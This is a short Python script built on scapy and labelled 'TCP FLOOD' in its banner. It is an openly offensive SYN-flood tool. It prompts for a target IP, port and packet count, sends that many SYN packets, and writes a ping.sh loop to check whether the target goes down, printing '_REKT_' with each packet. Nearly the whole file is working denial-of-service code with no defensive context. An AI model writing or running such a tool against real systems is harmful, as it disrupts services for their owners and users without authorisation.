import os 
from scapy.all import * 

def send_syn(TCP_IP, TCP_PORT):
    ip = IP(dst=TCP_IP)
    tcp = TCP(dport=TCP_PORT, flags='S')
    packet = ip/tcp
    send(packet, verbose=0)

def makebash(ip_address):
    bash_script_name = "ping.sh"
    bash_script_content = f"""#!/bin/bash
while true; do
    ping -c 1 {ip_address}
    sleep 3
done
"""
    
    with open(bash_script_name, 'w') as bash_file:
        bash_file.write(bash_script_content)
    os.chmod(bash_script_name, 0o755)
    print(color_red(f"Bash script '{bash_script_name}' created to ping {ip_address} every 3 seconds."))

def execute_bash_script():
    os.system('./ping.sh')

def color_red(text):
    RED = "\033[91m" 
    RESET = "\033[0m" 
    return f"{RED}{text}{RESET}" 

def color_white(text):
    WHITE = "\u001b[37m"
    RESET = "\033[0m"
    return f"{WHITE}{text}{RESET}"

def color_yellow(text):
    YELLOW = "\033[0;33m" 
    RESET = "\033[0m"
    return f"{YELLOW}{text}{RESET}"

def create_message(size):
    return b'X' * size 

print(color_red(""" 

  _____ ____ ____    _____ _     ___   ___  ____  
 |_   _/ ___|  _ \  |  ___| |   / _ \ / _ \|  _ \ 
   | || |   | |_) | | |_  | |  | | | | | | | | | |
   | || |___|  __/  |  _| | |__| |_| | |_| | |_| |
   |_| \____|_|     |_|   |_____\___/ \___/|____/ 
                                                  

"""))

TCP_IP = input(color_red("Enter the target IP address: "))
TCP_PORT = int(input(color_red("Enter the target port number: ")))
print(color_yellow("File to monitor ping of " + TCP_IP + " will be created. Run ./FLOOD/ping.sh in a seperate terminal after flood has been initialized."))
amount = int(input(color_red("Number of packets to send:")))

user_ip = TCP_IP
    
makebash(user_ip)
    
for i in range(amount):
    send_syn(TCP_IP, TCP_PORT)
    print(color_yellow(f"{i + 1}") + color_red("_REKT_") + color_yellow(f"{i + 1}") + color_red("_REKT_") + color_yellow(f"{i + 1}") + color_red("_REKT_") + color_yellow(f"{i + 1}"))

print("~DONE~") 




